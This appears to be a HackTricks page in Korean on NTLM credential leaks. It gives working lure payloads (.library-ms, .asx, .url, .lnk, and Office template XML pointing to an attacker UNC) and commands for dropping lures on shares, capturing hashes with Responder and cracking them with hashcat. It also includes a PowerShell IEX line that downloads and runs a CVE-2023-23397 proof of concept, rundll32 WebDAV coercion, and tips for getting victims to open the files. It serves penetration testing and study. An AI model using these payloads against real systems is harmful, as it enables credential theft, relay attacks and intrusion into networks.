# NTLM 자격 증명을 탈취할 수 있는 위치

{{#include ../../banners/hacktricks-training.md}}

**온라인에서 Microsoft Word 파일을 다운로드하는 것부터 NTLM leak이 발생하는 소스까지, [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)의 유용한 아이디어를 모두 확인하세요: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md 및 [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### 쓰기 가능한 SMB 공유 + Explorer가 트리거하는 UNC lure (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

사용자나 예약된 작업이 Explorer에서 탐색하는 공유에 **파일을 쓸 수 있다면**, 메타데이터가 공격자의 UNC(예: `\\ATTACKER\share`)를 가리키는 파일을 놓으세요. 폴더를 렌더링하면 **암묵적인 SMB 인증**이 발생하고 **NetNTLMv2**가 listener로 유출됩니다.<sup>[[1]](#references)</sup>

1. **lure 생성** (SCF/URL/LNK/library-ms/desktop.ini/Office/RTF 등 지원)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **쓰기 가능한 공유 폴더에 파일을 놓기** (피해자가 여는 아무 폴더):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **수신 및 crack**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows는 한 번에 여러 파일에 접근할 수 있습니다. Explorer에서 미리 볼 수 있는 항목(`BROWSE TO FOLDER`)은 클릭할 필요가 없습니다.

### Windows Media Player 재생 목록 (.ASX/.WAX)

대상이 사용자가 제어하는 Windows Media Player 재생 목록을 열거나 미리 보도록 유도할 수 있다면, 항목이 UNC 경로를 가리키게 해 Net-NTLMv2를 leak할 수 있습니다. WMP는 SMB를 통해 참조된 미디어를 가져오려고 시도하며, 이때 자동으로 인증합니다.<sup>[[3]](#references)[[4]](#references)</sup>

예시 payload:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

수집 및 cracking 흐름:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer는 ZIP 아카이브 내부에서 직접 연 .library-ms 파일을 안전하지 않게 처리합니다. 라이브러리 정의가 원격 UNC 경로(예: \\attacker\share)를 가리키면, ZIP 내부의 .library-ms를 탐색하거나 실행하기만 해도 Explorer가 UNC 경로를 열거하고 공격자에게 NTLM 인증 정보를 전송합니다. 이로 인해 오프라인에서 크랙하거나 잠재적으로 릴레이할 수 있는 NetNTLMv2가 노출됩니다.<sup>[[2]](#references)</sup>

공격자 UNC를 가리키는 최소한의 .library-ms 파일

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Operational steps
- 위 XML로 .library-ms 파일을 만듭니다(IP/hostname 설정).
- 파일을 ZIP으로 압축합니다(Windows에서는 보내기 → 압축(ZIP) 폴더). ZIP 파일을 target에 전달합니다.
- NTLM capture listener를 실행하고 victim이 ZIP 내부의 .library-ms 파일을 열 때까지 기다립니다.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net-NTLMv2 leak

Microsoft Outlook for Windows는 calendar item의 extended MAPI property PidLidReminderFileParameter를 처리했습니다. 해당 property가 UNC path(예: \\attacker\share\alert.wav)를 가리키면, reminder가 실행될 때 Outlook이 SMB share에 접속해 클릭 없이 사용자의 Net-NTLMv2를 leak했습니다. 이 문제는 2023년 3월 14일에 패치되었지만, 아직도 legacy/미관리 fleet 및 과거 사고 대응에서 매우 중요합니다.<sup>[[5]](#references)</sup>

PowerShell을 사용한 빠른 exploitation(Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

Listener 측:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

참고
- 알림이 실행될 때 피해자의 Windows용 Outlook이 실행 중이기만 하면 됩니다.
- 이 leak으로 오프라인 cracking 또는 relay에 사용할 수 있는 Net‑NTLMv2를 얻을 수 있습니다(pass-the-hash는 아님).


### .LNK/.URL 아이콘 기반 zero‑click NTLM leak (CVE‑2025‑50154 – CVE‑2025‑24054 우회)

Windows Explorer는 바로 가기 아이콘을 자동으로 렌더링합니다. 최근 연구에 따르면 Microsoft가 UNC 아이콘 바로 가기에 대한 2025년 4월 패치를 적용한 뒤에도, 바로 가기 대상을 UNC 경로에 호스팅하고 아이콘은 로컬에 두면 클릭 없이 NTLM 인증을 유발할 수 있었습니다(패치 우회에는 CVE‑2025‑50154가 할당됨). 폴더를 보기만 해도 Explorer가 원격 대상에서 메타데이터를 가져오면서 공격자의 SMB 서버로 NTLM을 전송합니다.<sup>[[6]](#references)</sup>

최소 Internet Shortcut 페이로드(.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

PowerShell을 통한 Program Shortcut payload (.lnk):

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Delivery 아이디어
- 바로가기를 ZIP에 넣고 피해자가 이를 찾아보게 합니다.
- 피해자가 열 공유 폴더에 바로가기를 배치합니다.
- 같은 폴더에 다른 미끼 파일을 함께 넣어 Explorer가 항목을 미리 보게 합니다.

### 클릭 없이 .LNK 아이콘 경로의 NTLM leak (CVE‑2026‑25185)

Windows는 `.lnk` 메타데이터를 실행 시뿐 아니라 **보기/미리 보기**(아이콘 렌더링) 중에도 로드합니다. CVE‑2026‑25185는 **ExtraData** 블록으로 인해 셸이 아이콘 경로를 확인하고 **로드 중에** 파일 시스템에 접근하는 파싱 경로를 보여 줍니다. 경로가 원격 경로인 경우 외부로 NTLM을 전송합니다.

주요 트리거 조건 (`CShellLink::_LoadFromStream`에서 관찰):
- ExtraData에 **DARWIN_PROPS** (`0xa0000006`)를 포함합니다 (아이콘 업데이트 루틴으로 진입하기 위한 조건).
- **TargetUnicode**가 채워진 **ICON_ENVIRONMENT_PROPS** (`0xa0000007`)를 포함합니다.
- 로더는 `TargetUnicode`의 환경 변수를 확장한 뒤 결과 경로에 `PathFileExistsW`를 호출합니다.

`TargetUnicode`가 UNC 경로(예: `\\attacker\share\icon.ico`)로 확인되면, 바로가기가 있는 폴더를 **보기만 해도** 외부 인증이 발생합니다. 같은 로드 경로가 **인덱싱** 및 **AV 검사**에서도 실행될 수 있어, 실용적인 무클릭 leak 공격 표면이 됩니다.<sup>[[7]](#references)</sup>

Windows GUI를 사용하지 않고 이러한 구조를 생성/검사할 수 있는 연구 도구(parser/generator/UI)가 **LnkMeMaybe** 프로젝트에서 제공됩니다.<sup>[[8]](#references)</sup>


### `davclnt.dll,DavSetCookie`를 통한 WebDAV 인증 강제 / 자격 증명 검증

기본 제공 **WebDAV 클라이언트**를 악용하면 현재 로그온 세션에서 임의의 **HTTP/WebDAV** 엔드포인트로 인증하도록 강제할 수 있습니다:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Why this is useful:
- **attacker-controlled WebDAV server**를 대상으로 하면 custom client를 배포하지 않고도 **NTLM over HTTP**를 트리거할 수 있습니다.
- **internal hosts**를 대상으로 하면 lateral movement를 하기 전에 탈취한 자격 증명이 어디서 허용되는지 조용히 **검증**할 수 있습니다.<sup>[[9]](#references)</sup>
- **SMB egress**는 필터링되지만 **HTTP/WebDAV**는 여전히 접근 가능한 경우, 이 명령은 좋은 대안입니다.

Operational notes:
- 소스 호스트에서 **WebClient** 서비스가 실행 중이어야 합니다.
- `rundll32.exe`는 `davclnt.dll`을 로드하고, Windows가 **현재 사용자의 자격 증명**을 사용해 WebDAV 인증을 처리하도록 합니다.<sup>[[10]](#references)</sup>
- 자신이 제어하는 인프라를 대상으로 지정한다면 다음과 같은 NTLM-aware HTTP listener/relay를 사용하세요:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

탐지 관점에서, 여러 내부 시스템을 대상으로 `rundll32.exe davclnt.dll,DavSetCookie`를 반복 실행하는 것은 정상적인 사용자 행동이라기보다 **자격 증명 검증 / spray와 유사한 횡적 이동 준비**를 나타내는 강력한 신호입니다.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm)으로 NTLM 인증 유도

Office 문서는 외부 템플릿을 참조할 수 있습니다. 연결된 템플릿을 UNC 경로로 설정하면 문서를 열 때 SMB 인증이 이루어집니다.

최소 DOCX 관계 변경 사항 (word/ 내):

1) word/settings.xml을 편집하고 연결된 템플릿 참조를 추가합니다:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) word/_rels/settings.xml.rels를 편집하고 rId1337이 자신의 UNC를 가리키도록 합니다:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) .docx로 다시 패키징해 전달합니다. SMB 캡처 리스너를 실행하고 파일이 열릴 때까지 기다립니다.

캡처 후 NTLM을 relay하거나 악용하는 방법은 다음을 참고하세요:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – 쓰기 가능한 공유 폴더 미끼 + Responder 캡처 → NetNTLMv2 크랙 → svc_mssql Kerberoast](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms 인증 leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16으로 DA 획득 (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → NTFS junction을 통한 webroot RCE → FullPowers + GodPotato로 SYSTEM 획득](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5가지 NTLM 취약점: Microsoft에서 패치되지 않은 권한 상승 위협](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft, Outlook EoP(CVE‑2023‑23397) 완화 및 PidLidReminderFileParameter를 통한 NTLM leak 설명](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click, one NTLM: Microsoft 보안 패치 우회(CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: CVE‑2026‑25185 검토](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe 도구](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – IT 지원 전화가 왔을 때: Teams에서 도메인 침해까지 이어지는 ModeloRAT 캠페인 분석](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h 헤더](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV 요청](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Netntlm Hashes 탈취 시 주목할 만한 위치](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
{{#include ../../banners/hacktricks-training.md}}
